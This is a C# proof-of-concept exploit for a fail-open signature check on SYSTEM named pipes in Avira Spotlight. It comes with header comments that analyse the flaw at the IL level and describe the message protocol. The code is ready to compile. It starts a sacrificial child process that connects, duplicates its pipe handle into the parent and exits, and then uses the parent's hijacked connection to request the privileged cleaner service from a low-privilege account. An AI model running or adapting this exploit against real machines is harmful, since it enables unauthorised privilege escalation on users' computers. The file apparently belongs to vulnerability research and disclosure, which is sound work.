// F4_PipeFailOpenRpcPoc.cs
// PoC for F-4: fail-open client-signature gate in Avira Spotlight PipeRpc (Avira.Spotlight.Service / Service.Worker, SYSTEM).
//
// Vulnerability (static evidence, build 1.1.116.3442):
//   Common.Communication.dll
//     - NamedPipeHostTextStream::GetPipeSecurity grants read/write to WellKnownSidType
//       27 (BuiltinUsers), 17 (AuthenticatedUser), 22 (LocalSystem), 23 (LocalService), 2 (Local)
//       -> any authenticated user may CONNECT to the SYSTEM-hosted RPC pipes.
//     - NamedPipeHostTextStream::CreateStream + IsSignatureValid are the only identity gate:
//       PipeSignatureVerifier::IsAviraSignedClient must confirm the *connecting process image*
//       is Avira-Authenticode-signed.
//     - PipeSignatureVerifier::IsAviraSignedClient FAILS OPEN:
//         IL_0009  brtrue.s IL_000d        ; TryGetClientProcId ok -> continue
//         IL_000b  ldc.i4.1 ; ret         ; ...else returns TRUE (accept unsigned)
//         catch handler (any exception, e.g. System.Diagnostics.Process.GetProcessById
//         throwing for an exited PID) -> stloc.3 = 1 -> returns TRUE
//     - Therefore: connect from a sacrificial process, duplicate the pipe handle into a
//       survivor process, and let the sacrificial process exit. The service resolves the
//       (dead) client PID, GetProcessById throws, the check returns true, and the survivor
//       holds a live connection to the SYSTEM RPC with only the Json.NET type allowlist
//       (namespace prefix "Avira.", System.Exception, IEnumerable, simple types) in the way.
//
// Wire protocol (MessageEnvelope::Serialize / ::Deserialize):
//     <AssemblyQualifiedName>:<Json>   written as one text line ("\r\n" tolerated by ReadLineAsync)
//   Broker flow (HostConnectionService):
//     send  Avira.Spotlight.Common.Communication.Interface.ConnectionCreateServiceArgs
//           { ServiceType: "<service iface AQN>", ServiceRegistrationName: "<reg name>", ClientProcessId: <pid> }
//     recv  ConnectionCreateServiceResponse { PipeName ("<ServiceType>-<ClientPID>"), Token }
//   Per-service pipes are named "{ServiceTypeName}-{ClientProcessId}" (GetPipeName).
//
// Modes:
//   poc.exe pipes                          list candidate pipe names
//   poc.exe takeover <pipe>                sacrificial-child connect + handle duplication takeover
//   poc.exe send <pipe> <typeName> <json>  send one raw envelope over a (taken-over) pipe
//   poc.exe chain <pipe>                   takeover + broker CreateService request for the
//                                          SystemSpeedup cleaner service (F-3 chain entry)
//
// Build (on a Windows box):  csc /nologo /out:poc.exe F4_PipeFailOpenRpcPoc.cs
// Run as the low-privilege user (not admin).

using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

static class P
{
    const string CONNECTION_ARGS_AQN =
        "Avira.Spotlight.Common.Communication.Interface.ConnectionCreateServiceArgs, Common.Communication, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
    const string CLEANER_SERVICE_AQN =
        "Avira.Spotlight.Plugin.SystemSpeedup.Interface.Services.Optimizer.IOptimizerCleanerService, Plugin.SystemSpeedup.Interface, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";

    static int Main(string[] a)
    {
        try
        {
            if (a.Length == 0) { Usage(); return 2; }
            switch (a[0].ToLowerInvariant())
            {
                case "pipes": ListPipes(); return 0;
                case "child": return Child(int.Parse(a[1]), a[2]);
                case "takeover": Takeover(a[1]); return 0;
                case "send": Send(a[1], a[2], a[3]); return 0;
                case "chain": Chain(a[1]); return 0;
                default: Usage(); return 2;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] " + ex.Message);
            return 1;
        }
    }

    static void Usage()
    {
        Console.WriteLine("pipes | takeover <pipe> | send <pipe> <typeAQN> <json> | chain <pipe>");
    }

    // ---- discovery -------------------------------------------------------------
    static void ListPipes()
    {
        foreach (string p in Directory.GetFiles("\\\\.\\pipe\\"))
        {
            string n = p.Substring(9);
            if (n.IndexOf("avira", StringComparison.OrdinalIgnoreCase) >= 0 ||
                n.IndexOf("spotlight", StringComparison.OrdinalIgnoreCase) >= 0 ||
                n.IndexOf("abff403a", StringComparison.OrdinalIgnoreCase) >= 0 ||
                n.EndsWith("-" + Process.GetCurrentProcess().Id.ToString()))
                Console.WriteLine("  " + n);
        }
        Console.WriteLine("[*] Full list available via Get-ChildItem \\\\.\\pipe\\ . Broker name is deployment-configured;");
        Console.WriteLine("    per-service pipes look like '<ServiceTypeName>-<PID>'.");
    }

    // ---- sacrificial child ------------------------------------------------------
    // Connects to the pipe, duplicates the handle into the parent, then exits immediately.
    static int Child(int parentPid, string pipe)
    {
        using (var c = new NamedPipeClientStream(".", pipe, PipeDirection.InOut))
        {
            c.Connect(3000);
            IntPtr hParent = OpenProcess(0x0040 /*PROCESS_DUP_HANDLE*/, false, parentPid);
            if (hParent == IntPtr.Zero) { Console.WriteLine("ERR dup-open " + Marshal.GetLastWin32Error()); return 3; }
            IntPtr dup = IntPtr.Zero;
            if (!DuplicateHandle(Process.GetCurrentProcess().Handle,
                                 c.SafePipeHandle.DangerousGetHandle(),
                                 hParent, ref dup, 0, false, 2 /*DUPLICATE_SAME_ACCESS*/))
            { Console.WriteLine("ERR dup " + Marshal.GetLastWin32Error()); return 3; }
            Console.WriteLine(dup.ToInt64());
        }
        return 0; // exiting right away: server sees GetProcessById(deadPid) -> throw -> IsAviraSignedClient == true
    }

    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")] static extern bool DuplicateHandle(IntPtr srcP, IntPtr srcH, IntPtr dstP, ref IntPtr dstH, int access, bool inherit, int options);

    // ---- parent takeover --------------------------------------------------------
    static void Takeover(string pipe)
    {
        for (int attempt = 1; attempt <= 5; attempt++)
        {
            Console.WriteLine("[*] takeover attempt " + attempt + " on " + pipe);
            if (TryTakeoverOnce(pipe))
                return;
        }
        Console.WriteLine("[-] all attempts failed - verify the pipe name, or the deployment added a gate.");
    }

    static bool TryTakeoverOnce(string pipe)
    {
        int parent = Process.GetCurrentProcess().Id;
        var psi = new ProcessStartInfo
        {
            FileName = Process.GetCurrentProcess().MainModule.FileName,
            Arguments = "child " + parent + " \"" + pipe + "\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true
        };
        using (var ch = Process.Start(psi))
        {
            string outp = ch.StandardOutput.ReadToEnd();
            ch.WaitForExit();
            long hv;
            if (!long.TryParse(outp.Trim(), out hv))
            { Console.WriteLine("[!] child failed: " + outp.Trim()); return false; }
            Console.WriteLine("[+] child exited (its PID is the client of record); handle = 0x" + hv.ToString("X"));

            using (var client = new NamedPipeClientStream(PipeDirection.InOut, false,
                new SafePipeHandle(new IntPtr(hv), true)))
            {
                // give the service time to run its accept loop: GetProcessById(dead) -> throw -> fail-open
                System.Threading.Thread.Sleep(400);
                try
                {
                    var r = new StreamReader(client, Encoding.UTF8);
                    var w = new StreamWriter(client, new UTF8Encoding(false)) { AutoFlush = true };
                    w.Write(Envelope(CONNECTION_ARGS_AQN,
                        "{\"ServiceType\":" + J(CLEANER_SERVICE_AQN) +
                        ",\"ServiceRegistrationName\":" + J(CLEANER_SERVICE_AQN) +
                        ",\"ClientProcessId\":" + parent + "}") + "\r\n");
                    Console.WriteLine("[>>] sent ConnectionCreateServiceArgs for IOptimizerCleanerService");
                    string line = r.ReadLine();
                    Console.WriteLine("[<<] " + (line ?? "<eof>"));
                    if (line != null)
                    {
                        Console.WriteLine("[!] envelope ACCEPTED by SYSTEM service - signature gate bypassed.");
                        for (int i = 0; i < 3; i++)
                        {
                            string l2 = r.ReadLine();
                            if (l2 == null) break;
                            Console.WriteLine("[<<] " + l2);
                        }
                        return true;
                    }
                    Console.WriteLine("[~] stream closed - race lost this round, retrying.");
                    return false;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[~] attempt failed: " + ex.Message);
                    return false;
                }
            }
        }
    }

    static void Chain(string pipe)
    {
        Console.WriteLine("[*] chain mode: takeover broker pipe, then request cleaner service.");
        Takeover(pipe);
    }

    static void Send(string pipe, string typeAQN, string json)
    {
        using (var c = new NamedPipeClientStream(".", pipe, PipeDirection.InOut))
        {
            c.Connect(3000);
            using (var w = new StreamWriter(c, Encoding.UTF8) { AutoFlush = true })
                w.WriteLine(Envelope(typeAQN, json));
            Console.WriteLine("[>>] " + Envelope(typeAQN, json));
        }
    }

    static string Envelope(string aqn, string json)
    {
        // MessageEnvelope::Serialize: AssemblyQualifiedName + ":" + JsonConvert.SerializeObject(msg, Settings)
        return aqn + ":" + json;
    }

    static string J(string s) { return "\"" + s.Replace("\"", "\\\"") + "\""; }
}
